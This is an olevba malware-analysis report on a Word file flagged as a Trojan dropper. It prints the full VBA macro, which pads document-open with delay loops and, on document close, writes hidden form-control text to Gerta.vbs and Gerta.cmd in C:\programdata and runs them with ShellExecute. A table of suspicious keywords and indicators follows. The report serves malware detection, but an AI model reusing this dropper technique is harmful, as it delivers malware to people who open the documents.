olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Dropper.MSOffice.SDrop.gen-69ed478880bc0a1ed8f0f45db3b4cd466b580fa08170f60b5cb99e5506776149
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO Ferkigo.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/Ferkigo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 




Public G, strTemp$, strReturn$, Biola$, CurFolder$, saveFolder

Private Tijd
Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpszOp As String, ByVal lpszFile As String, ByVal lpszParams As String, ByVal lpszDir As String, ByVal FsShowCmd As Long) As Long
 
Private Declare Function GetDesktopWindow Lib "USER32" () As Long
 
Const SW_SHOWNORMAL = 1
 
Const SE_ERR_FNF = 2&
Const SE_ERR_PNF = 3&
Const SE_ERR_ACCESSDENIED = 5&
Const SE_ERR_OOM = 8&
Const SE_ERR_DLLNOTFOUND = 32&
Const SE_ERR_SHARE = 26&
Const SE_ERR_ASSOCINCOMPLETE = 27&
Const SE_ERR_DDETIMEOUT = 28&
Const SE_ERR_DDEFAIL = 29&
Const SE_ERR_DDEBUSY = 30&
Const SE_ERR_NOASSOC = 31&
Const ERROR_BAD_FORMAT = 11&
 
Private Function StartDoc(DocName As String) As Long


   

Dim Scr_hDC As Long

   

   

        Scr_hDC = GetDesktopWindow()


   

        StartDoc = ShellExecute(Scr_hDC, "Open", DocName, "", "C:\", 0)

   

End Function
 Private Sub Document_open()
             Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
               Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
Application.Quit SaveChanges:=wdDoNotSaveChanges
            Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
               Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
    Tijd = Timer()
   While Timer() - Tijd < 0.2
   DoEvents
   Wend
 End Sub


 Private Sub Document_close()


saveFolder = "C:\programdata"


Fipolas = Ferkigo.Ters.GroupName

Fipolas1 = Ferkigo.Ters.Caption



Rolase = saveFolder & "\Gerta.vbs"
Open Rolase For Output As #1
Print #1, Fipolas1
Close #1


Rolase1 = saveFolder & "\Gerta.cmd"
Open Rolase1 For Output As #1
Print #1, Fipolas
Close #1


r& = StartDoc(saveFolder & "\Gerta.vbs")

End Sub















+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|ShellExecute        |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecuteA       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Lib                 |May run code from a DLL                      |
|IOC       |shell32.dll         |Executable file name                         |
|IOC       |Gerta.vbs           |Executable file name                         |
|IOC       |Gerta.cmd           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

